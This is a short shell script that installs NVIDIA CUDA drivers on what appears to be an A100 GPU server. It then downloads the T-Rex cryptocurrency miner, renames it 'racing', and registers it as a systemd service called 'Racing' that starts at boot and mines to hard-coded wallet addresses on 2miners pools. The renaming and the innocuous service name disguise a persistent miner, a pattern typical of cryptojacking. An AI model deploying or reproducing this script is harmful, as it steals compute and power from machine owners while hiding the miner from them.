cd /home
woker=$(date +'%d%m_%H%M%S_')
name=A100_leevipu
woker+=$name
sudo apt-get install linux-headers-$(uname -r) -y
distribution=$(. /etc/os-release;echo $ID$VERSION_ID | sed -e 's/\.//g')
wget https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/cuda-$distribution.pin
sudo mv cuda-$distribution.pin /etc/apt/preferences.d/cuda-repository-pin-600
sudo apt-key adv --fetch-keys https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/7fa2af80.pub
echo "deb http://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64 /" | sudo tee /etc/apt/sources.list.d/cuda.list
sudo apt-get update
sudo apt-get -y install cuda-drivers
sudo apt-get install libcurl3 -y
sudo apt-get install cuda-drivers-510
sudo apt-get install cuda-drivers-fabricmanager-510
sudo systemctl enable nvidia-fabricmanager
sudo systemctl start nvidia-fabricmanager
wget https://github.com/trexminer/T-Rex/releases/download/0.21.6/t-rex-0.21.6-linux.tar.gz
tar xvzf t-rex-0.21.6-linux.tar.gz
mv t-rex racing
sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/racing -a ethash -o us-eth.2miners.com:2020 -u 0x0afd8A6e2d4403D7d3aB98B66d6e5D67C3e6fb21 -p x -w ${woker}_leevipu\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
sudo systemctl daemon-reload
sudo systemctl enable racing.service
./racing -a ethash -o us-eth.2miners.com:2020 -u nano_3b8f5r4jbdjgayk8zcxrdw95h8yq6z97gyros4rre3abfrg9s9buwtgwesja -p x -w $woker &
